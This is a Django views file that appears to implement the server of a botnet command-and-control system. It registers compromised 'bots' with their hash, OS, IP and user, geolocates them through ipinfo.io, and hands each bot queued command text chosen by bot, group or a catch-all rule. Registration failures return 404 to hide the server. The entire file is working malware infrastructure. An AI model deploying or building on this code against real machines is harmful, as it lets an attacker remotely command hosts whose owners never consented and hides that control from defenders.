import random
import json
from urllib.request import urlopen

from django.shortcuts import render, get_object_or_404
from django.http import HttpResponse, HttpResponseRedirect, Http404
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone

from .models import Bot, Command

def get_group(operating_sys, user):
    with open('groups.json', 'r') as infile:
        groups = json.loads(infile.read())
    users = groups[operating_sys.lower()]
    try:
        group_num = users[user]
    except KeyError:
        group_num = users['standard']

    return group_num

# Views begin here

def index(request):
    return HttpResponse('')


@csrf_exempt
def register(request):
    try:
        hash_type = request.POST['hash_type']
        hash_sum = request.POST['hash_sum']
        operating_sys = request.POST['operating_sys']
        ip_addr = request.POST['ip_addr']
        user = request.POST['user']
        group = get_group(operating_sys, user)
        last_contact = timezone.now()

        geo_html = urlopen('https://ipinfo.io/{}/geo'.format(ip_addr)).read().decode('utf-8')
        geo_json = json.loads(geo_html)
        geolocation = geo_json['country']

        bot = Bot(
            hash_type=hash_type,
            hash_sum=hash_sum,
            group=group,
            operating_sys=operating_sys,
            user=user,
            ip_addr=ip_addr,
            geolocation=geolocation,
            last_contact=last_contact,
        )

        bot.save()
        return HttpResponse(200)
    except:
        # An error in registration likely means tampering or something gone wrong
        # Return a 404 for the sake of obfuscation
        return HttpResponse(404)


@csrf_exempt
def cmd(request):
    hash_sum = request.POST['hash_sum']
    ip_addr = request.POST['ip_addr']

    bot = get_object_or_404(Bot, hash_sum=hash_sum)
    bot.ip_addr = ip_addr
    bot.last_contact = timezone.now()
    bot.save()
    bot_group = bot.group

    # Only use commands that are queued to run at this time
    now = timezone.now()
    query_set = Command.objects.filter(
        start_time__lte=now,
        end_time__gte=now
    )

    # Prioritize individual commands, ALL commands, group commands, and lastly
    # default commands
    try:
        if query_set.filter(hash_assigned=hash_sum):
            command = query_set.filter(hash_assigned=hash_sum)[0]

        elif query_set.filter(group_assigned=-1):
            command = query_set.filter(group_assigned=-1)[0]

        elif query_set.filter(group_assigned=bot_group):
            command = query_set.filter(group_assigned=bot_group)[0]

        else:
            command = query_set.filter(group_assigned=-2)[0]

    except IndexError:
        raise Http404

    return HttpResponse(command.cmd_txt)
